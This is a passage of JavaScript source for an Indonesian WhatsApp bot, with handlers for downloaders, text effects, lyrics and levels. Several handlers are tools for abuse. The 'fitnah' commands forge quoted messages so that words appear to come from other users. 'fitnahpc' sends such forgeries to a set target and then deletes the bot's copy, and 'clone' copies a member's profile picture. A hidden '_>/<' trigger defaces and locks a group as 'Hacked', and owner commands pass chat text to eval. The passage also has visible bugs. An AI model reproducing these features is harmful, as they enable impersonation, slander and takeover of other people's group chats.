filsize = args[0]
costick = await client.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
client.relayWAMessage(costick)
break
// Volume Audio ( MyMans APIs )

// Ngebalik Huruf ( MyMans APIs )
case 'fliptext':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply(`Example:\n${prefix}fliptext MyMans`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
break
// Angka To Huruf ( MyMans APIs )
case 'tohuruf':
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await toHur(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
replysticker(errorstc)
}

// Photooxy ( MyMans APIs )
case 'phy':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply(`Example :\n${prefix}phy <name>`)
if (args[0] === 'glitch') {
if (args.length < 2) return reply(`Example :\n${prefix}phy glitch MyMans|Hacker 404`)
var cv = body.slice(12)
var quer = cv.split("|")[0];
var quer1 = cv.split("|")[1];

ph.pGlitch(quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'coffecup') {
if (args.length < 2) return reply(`Example :\n${prefix}phy coffecup MyMans`)
anu = body.slice(14)

ph.pCoffeCup(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'shadow') {
if (args.length < 2) return reply(`Example :\n${prefix}phy shadow MyMans`)
anu = body.slice(12)

ph.pShadow(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'neon') {
if (args.length < 2) return reply(`Example :\n${prefix}phy neon MyMans`)
anu = body.slice(9)

ph.pNeons(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'wanted') {
if (args.length < 2) return reply(`Example :\n${prefix}phy wanted https://telegra.ph/file/af4038f3cd8db3831aa28.jpg|MyMans|Hacker 404`)
var cv = body.slice(12)
var uri = cv.split("|")[0];
var quer = cv.split("|")[1];
var quer1 = cv.split("|")[2];

ph.pWanted(uri, quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else {
reply(`*List Photooxy :*\n•> glitch\n•> coffecup\n•> shadow\n•> wanted\n•> neon`)
}
break


// Twitter Downloader ( MyMans APIs )
case 'twmp4':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply('Link?')
lin = args[0]

hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
// Twitter Downloader ( MyMans APIs )
case 'twmp3':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply('Link?')
lin = args[0]

hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
client.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'hexagan.mp3', quoted:mek, ptt:true})
})
break

// Tag ( MyMans APIs )
case 'tag':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
client.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
// Copy Paste ( MyMans APIs & Nurutomo )
case 'q': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
let qse = client.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break

case 'ttmp4':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
case 'ttmp3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
client.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'hexagans.mp3', ptt:true})
})
break
case 'lirik':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break

		 case 'linkwa':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
			
    case 'fitnah':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await client.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await client.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'kontak':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            client.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    

    case 'ig':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
 
    case 'fb':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
 
    case 'join':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await client.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'caripesan':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q)return reply('pesannya apa bang?')
            let v = await client.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await client.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'igstory': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'chara':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await client.sendMessage(from,li,image,{quoted: mek, thumbnail: Buffer.alloc(0)})
            break
    case 'pinterest':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await client.sendMessage(from,di,image,{quoted: mek, thumbnail: Buffer.alloc(0)})
            break
			case 'fitnah2':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                if (!isGroup) return reply(ind.groupo())
                if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
				if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag/pesan/balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember/hai/hai juga`)
				var gh = body.slice(8)
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				var replace = gh.split("/")[0];
				var target = gh.split("/")[1];
				var bot = gh.split("/")[2];
				client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
				await confirmLIMIT(sender, [angka])
			break
			case 'fitnah':
                if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnah pesan|balasanbot]]\n\nEx : \n${prefix}${command} terkutuk lah|bacot`)
                var gh = body.slice(8)
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                var target = gh.split("|")[0];
                var bot = gh.split("|")[1];
                client.sendMessage(from, `${bot}`, text, { quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` } } })
              await confirmLIMIT(sender, [angka])
			  break
			  	case 'level':
                if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (!isGroup) return reply(ind.groupo())
				if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                resul = `\`\`\` 「 LEVEL 」 \`\`\`\n➣ \`\`\` Nama\`\`\`  : ${pushname}\n➣ \`\`\` Nomor\`\`\`  : ${sender.split("@")[0]}\n➣ \`\`\` Role\`\`\`  : ${role}\n➣ \`\`\` User XP\`\`\`  :  ${userXp}/${requiredXp}\n➣ \`\`\` User Level\`\`\`  : ${userLevel}`
               client.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
				break 
					//Fun not faedah
               case 'brainly':

					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					client.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
						case 'clone':
				if (!isGroup) return reply(dpa.groupo)
				if (!isOwner) return reply(dpa.ownerb)
				if (args.length < 1) return reply('TAG YANG MAU DI CLONE!!!')
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
				try {
				pp = await client.getProfilePicture(id)
				buffer = await getBuffer(pp)
				client.updateProfilePicture(botNumber, buffer)
				mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
				} catch (e) {
				reply(dpa.stikga)
				}
			break
default:
const partiNum = (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.contextInfo.participant : ''
// Antitag Via Reply ( luc bot APIs )
if (own.includes(partiNum)) {
if (antitags === false) return
if (mek.key.fromMe) return
if (isOwner) return
replysticker(needownstc)
}
if (budy.startsWith('_>/<')){
if (!isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
anu = fs.readFileSync('strg/image/gaklah.jpeg')
client.updateProfilePicture(from, anu)
client.groupUpdateSubject(from, `Hacked Siegrin`)
client.groupUpdateDescription(from, `Mampos Gw Kudet`)
client.groupSettingChange(from, GroupSettingChange.messageSend, true)
setTimeout(() => {
reply('Mwuehehe kena hack kacian')
}, 8000)
}
		
if (budy.startsWith('x')){
try {
if (!isOwner) return replysticker(ownerstc)
return client.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!isOwner) return replysticker(ownerstc)
return client.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
